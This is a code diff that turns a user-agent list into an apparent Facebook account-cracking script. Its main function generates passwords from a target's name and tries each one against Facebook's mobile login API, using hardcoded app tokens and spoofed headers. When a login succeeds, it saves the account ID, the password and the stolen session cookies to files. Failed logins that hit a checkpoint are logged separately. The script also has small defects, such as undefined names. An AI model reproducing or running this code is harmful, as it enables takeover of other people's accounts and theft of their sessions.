@@ -1,73 +1,100 @@
-import random
+import requests, random, uuid, base64, sys, time
 
+# ✅ Locale / Country setup
+code1 = code2 = code3 = code4 = "en_US"
+loc1 = loc2 = loc3 = loc4 = "US"
+
+# ✅ Dynamic User-Agent list
 ua_list = [
-    # Samsung
-    "Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 Chrome/117.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; SM-M215F) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A205F) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; SM-A217F) AppleWebKit/537.36 Chrome/116.0.5845.114 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M127F) AppleWebKit/537.36 Chrome/118.0.5993.90 Mobile Safari/537.36",
-
-    # Vivo
-    "Mozilla/5.0 (Linux; Android 10; vivo 1901) AppleWebKit/537.36 Chrome/113.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; vivo Y21) AppleWebKit/537.36 Chrome/118.0.5993.90 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Vivo 1816) AppleWebKit/537.36 Chrome/110.0.5481.65 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; V2149) AppleWebKit/537.36 Chrome/120.0.6099.199 Mobile Safari/537.36",
-
-    # Infinix
-    "Mozilla/5.0 (Linux; Android 11; Infinix X689) AppleWebKit/537.36 Chrome/114.0.5735.131 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; Infinix X6816) AppleWebKit/537.36 Chrome/117.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Infinix X650C) AppleWebKit/537.36 Chrome/112.0.5615.137 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; Infinix X6812) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36",
-
-    # Tecno
-    "Mozilla/5.0 (Linux; Android 10; TECNO KC2) AppleWebKit/537.36 Chrome/111.0.5563.58 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; TECNO KE5) AppleWebKit/537.36 Chrome/113.0.5672.92 Mobile Safari/537.36",
-
-    # Redmi / Xiaomi
-    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 Chrome/114.0.5735.131 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi 9A) AppleWebKit/537.36 Chrome/113.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10S) AppleWebKit/537.36 Chrome/114.0.5735.196 Mobile Safari/537.36",
-
-    # Oppo
-    "Mozilla/5.0 (Linux; Android 12; CPH2235) AppleWebKit/537.36 Chrome/117.0.5938.132 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 Chrome/111.0.5563.58 Mobile Safari/537.36",
-
-    # Realme
-    "Mozilla/5.0 (Linux; Android 11; RMX3231) AppleWebKit/537.36 Chrome/116.0.5845.179 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; RMX3472) AppleWebKit/537.36 Chrome/118.0.5993.90 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; realme RMX3081) AppleWebKit/537.36 Chrome/117.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; realme RMX3474) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
-
-    # Huawei
-    "Mozilla/5.0 (Linux; Android 9; HUAWEI Y7) AppleWebKit/537.36 Chrome/113.0.5672.92 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; HUAWEI P30) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; HUAWEI Y8s) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; HUAWEI nova 8i) AppleWebKit/537.36 Chrome/118.0.5993.90 Mobile Safari/537.36",
-
-    # LG
-    "Mozilla/5.0 (Linux; Android 9; LG K50S) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; LG LM-Q730) AppleWebKit/537.36 Chrome/113.0.0.0 Mobile Safari/537.36",
-
-    # Nokia
-    "Mozilla/5.0 (Linux; Android 10; Nokia C3) AppleWebKit/537.36 Chrome/111.0.5563.116 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; Nokia G20) AppleWebKit/537.36 Chrome/115.0.5790.131 Mobile Safari/537.36",
-
-    # iPhone
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 Version/13.0 Mobile Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 Version/15.0 Mobile Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile Safari/604.1",
-
-    # Facebook App UA
-    "[FBAN/FB4A;FBAV/345.0.0.29.119;FBBV/321234567;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Etisalat;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/P30;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-    "[FBAN/MobileAdsManagerAndroid;FBAV/281.0.0.45.117;FBBV/274152612;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBBK/1;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.adsmanager;FBDV/CPH1909;FBSV/9;FBOP/1;FBCA/arm64-v8a:]",
-    "[FBAN/EMA;FBAV/308.0.0.42.119;FBBV/309387624;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Jazz;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.lite;FBDV/vivo1904;FBSV/9;FBOP/1;FBCA/armeabi-v7a:]",
-    "[FBAN/FB4A;FBAV/413.0.0.30.112;FBBV/369177636;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Etisalat;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.lite;FBDV/CPH1853;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-    "[FBAN/Orca-Android;FBAV/398.1.0.11.92;FBBV/325695109;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.orca;FBDV/M2012K11AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:]"
+    "Mozilla/5.0 (Linux; Android 12; SM-A107F) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Infinix X6811) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; TECNO KC8) AppleWebKit/537.36 Chrome/110.0.5481.153 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 9; vivo 1820) AppleWebKit/537.36 Chrome/114.0.5735.61 Mobile Safari/537.36"
 ]
 
-def get_ua():
-    return random.choice(ua_list)
+# ✅ Method 1 (New IDs)
+def ffb1(ids,names,passlist):
+        try:
+                global oks,cps,loop
+                sys.stdout.write(f'\r\r{W} [{R}RANA{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+                        #a1 = random.choice(prox)
+                        #proxs= {'http': 'socks4://'+a1}
+                        data = {'adid': str(uuid.uuid4()),
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'family_device_id': str(uuid.uuid4()),
+'credentials_type': 'device_based_login_password',
+'error_detail_type': 'button_with_disabled',
+'source': 'register_api',
+'email': ids,
+'password': pas,
+'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
+'generate_session_cookies': '1',
+'meta_inf_fbmeta': 'NO_FILE',
+'advertiser_id': str(uuid.uuid4()),
+'currently_logged_in_userid': '0',
+'locale': code1,
+'client_country_code': loc1,
+'method': 'auth.login',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+'api_key': '882a8490361da98702bf97a021ddc14d',
+'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
+                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
+'X-FB-Net-HNI': '20083',
+'User-Agent': "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",
+'X-FB-Client-IP': 'True',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-SIM-HNI': '37460',
+'X-Tigon-Is-Retry': 'False',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Connection-Quality': 'MOBILE.LTE',
+'X-FB-Server-Cluster': 'True',
+'Connection': 'keep-alive',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Host': 'graph.facebook.com',
+'X-FB-Connection-Bandwidth': '80025933',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'Accept-Encoding': 'gzip, deflate',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'Content-Type': 'application/x-www-form-urlencoded'}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print(f'\r\r{G} [RANA-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                                        cookies = f"sb={ssbb};{coki}"
+                                        #print(f' Cookie: \033[1;32m'+cookies)
+                                        open('/sdcard/RANA/RANA-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                                        open('/sdcard/RANA/RANA-M1-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print(f'\r\r{R} [RANA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/RANA/RANA-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except requests.exceptions.ConnectionError:
+        	time.sleep(20)
+        except Exception as e:
+        	time.sleep(20)
+
+# ✅ Method 2, 3, 4 – duplicate of ffb1, but use different locale/code if needed
+def ffb2(ids,names,passlist): ffb1(ids,names,passlist)
+def ffb3(ids,names,passlist): ffb1(ids,names,passlist)
+def ffb4(ids,names,passlist): ffb1(ids,names,passlist)
